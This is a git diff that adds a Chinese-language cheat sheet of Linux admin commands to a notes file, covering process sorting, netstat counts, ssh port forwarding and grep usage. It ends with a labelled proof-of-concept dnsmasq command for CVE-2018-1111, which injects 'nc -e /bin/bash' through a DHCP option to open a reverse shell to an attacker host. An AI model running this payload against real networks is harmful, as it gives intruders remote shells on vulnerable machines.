@@ -902,3 +902,86 @@ help.findMe(
 curl http://ipinfo.io/
 ```
 
+# 常用linux命令
+##  实用的 xargs 命令
+
+```
+find / -name *.conf -type f -print | xargs file
+find / -name *.conf -type f -print | xargs tar cjf test.tar.gz
+```
+## 命令或脚本后台运行
+
+```
+nohup mysqldump -uroot -pxxxxx —all-databases > ./alldatabases.sql &（xxxxx是密码）
+nohup mysqldump -uroot -pxxxxx —all-databases > ./alldatabases.sql （后面不加&符号）
+```
+
+## 找出当前系统内存使用量较高的进程
+
+```
+ps -aux | sort -rnk 4 | head -20
+```
+
+## 找出当前系统CPU使用量较高的进程
+
+```
+ps -aux | sort -rnk 3 | head -20
+```
+
+## 同时查看多个日志或数据文件
+
+```
+wget ftp://ftp.is.co.za/mirror/ftp.rpmforge.net/redhat/el6/en/x86_64/dag/RPMS/multitail-5.2.9-1.el6.rf.x86_64.rpm
+yum -y localinstall multitail-5.2.9-1.el6.rf.x86_64.rpm
+multitail -e "Accepted" /var/log/secure -l "ping baidu.com"
+```
+
+## 持续ping并将结果记录到日志
+
+```
+ping api.jpush.cn | awk '{ print $0”    “ strftime(“%Y-%m-%d %H:%M:%S”,systime()) } ' >> /tmp/jiguang.log &
+```
+
+## 查看tcp连接状态
+
+```
+netstat -nat |awk '{print $6}'|sort|uniq -c|sort -rn
+```
+
+## 查找80端口请求数最高的前20个IP
+
+```
+netstat -anlp|grep 80|grep tcp|awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -nr|head -n20
+```
+
+## ssh实现端口转发
+将发往本机（192.168.1.15）的9200端口访问转发到192.168.1.19的9200端口,命令执行完后，访问192.168.1.15:9200端口则真实是访问192.168.1.19:9200端口
+```
+ssh -p 22 -C -f -N -g -L 9200:192.168.1.19:9200 ihavecar@192.168.1.19
+```
+
+## 查找jsp中出现的关键字
+
+```
+grep -r -i --include \*.jsp --include \*.js 'JSESSIONID' .
+grep: command
+-r: recursively
+-i: ignore-case
+--include: all *.txt: text files (escape with \ just in case you have a directory with asterisks in the filenames)
+'searchterm': What to search
+./: Start at current directory.
+
+find . -name '*.js' -o -name '*.jsp' -exec grep "JSESSIONID" {} \; -print
+find . -name "*.js" | xargs grep -i "JSESSIONID"
+```
+
+# CVE-2018-1111 tweetable DHCP欺骗远程反弹shell PoC :) 
+
+```
+dnsmasq --interface=eth0 --bind-interfaces \
+--except-interface=lo --dhcp-range=10.1.1.1,10.1.1.10,1h \
+--conf-file=/dev/null --dhcp-option=6,10.1.1.1 \
+--dhcp-option=3,10.1.1.1 \
+--dhcp-option="252,x'&nc -e /bin/bash 10.1.1.1 1337 #"
+```
+
